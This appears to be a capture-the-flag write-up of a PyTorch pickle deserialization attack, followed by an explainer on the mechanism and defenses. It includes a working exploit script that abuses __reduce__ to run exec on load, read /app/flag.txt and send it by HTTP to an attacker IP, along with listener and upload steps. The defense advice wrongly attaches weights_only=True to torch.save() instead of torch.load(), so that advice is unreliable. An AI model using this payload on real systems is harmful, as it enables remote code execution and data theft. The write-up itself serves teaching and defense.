# PyTorch Insecure Deserialization Attack Explanation

## Overview
This attack exploits insecure deserialization in PyTorch's `torch.load()` function. Because PyTorch models use Python's `pickle` module under the hood, uploading a malicious object forces the server to execute embedded code instructions the moment it loads the file.

## Step-by-Step Breakdown
1. **The Vulnerability**: The server blindly calls `torch.load()` on user-uploaded `.pth` model files. 
2. **The Mechanism (`__reduce__`)**: Python's pickle engine uses the `__reduce__` method to figure out how to reconstruct an object in memory. We abuse this to trigger Python's built-in `exec` function automatically upon deserialization.
3. **Pure Python Payload**: Rather than relying on missing system binaries like netcat, the payload uses Python's native `pathlib` to read `/app/flag.txt` and `urllib` to beam the flag back to our attack machine via an HTTP GET request.

## Example Exploit Script (exploit.py)
import os
import torch

HOST_IP = "10.10.15.209"
PORT = 4444

class ExfilPayload:
    def __reduce__(self):
        exfil_code = (
            "import urllib.request, pathlib;"
            "flag = pathlib.Path('/app/flag.txt').read_text().strip();"
            f"urllib.request.urlopen('http://{HOST_IP}:{PORT}/?flag=' + flag)"
        )
        return (exec, (exfil_code,))

if __name__ == "__main__":
    torch.save(ExfilPayload(), "malicious_trojan_model.pth")

## Execution Steps
- Start listener: python3 -m http.server 4444
- Generate payload: python3 exploit.py
- Upload model: python3 upload.py
- Retrieve the flag from your HTTP server request logs.

Extra info: 

```
1. The Core Problem: Serialization vs. Code Execution
When developers want to save a machine learning model, they serialize it (convert it into a file format like .pth, .pt, or .pkl) so it can be stored or shared.

Unlike safe data formats like JSON, Python's pickle module (which PyTorch uses under the hood for torch.save() and torch.load()) is designed to serialize objects and code instructions.

When a pickle file is loaded, Python doesn't just read data—it executes the instructions embedded inside the file to rebuild those objects in memory.

2. The Attacker's Strategy
If an application blindly trusts a user-uploaded model file and calls torch.load() on it, an attacker can craft a malicious file that turns model loading into remote code execution:

The Custom Class (__reduce__): Python allows classes to define a special method called __reduce__. This method tells the pickle engine how an object should be reconstructed. Attackers abuse this by pointing __reduce__ to dangerous built-in functions like os.system or exec.

Payload Delivery: Instead of storing valid neural network weights, the file contains a serialized payload designed to run arbitrary commands (such as exfiltrating sensitive files, opening a reverse shell, or dropping malware) the exact moment the server deserializes it.

3. Why It’s Dangerous in AI/ML
This vulnerability is widespread in machine learning pipelines because:

Blind Trust: Platforms often encourage sharing models (.pth, .h5, .pkl) across public repositories or user upload portals without scanning or sandboxing the underlying pickling stream.

Standard Practices: Developers frequently use torch.load() on untrusted files downloaded from the internet or uploaded by users, assuming they are just reading numbers (tensors) rather than executable code.

The Defense: To prevent this, modern applications should avoid torch.load() on untrusted files, use safer alternatives like torch.save() with weights_only=True (which restricts loading to basic tensor data), or switch to safer serialization formats like Safetensors that cannot execute arbitrary code.
```
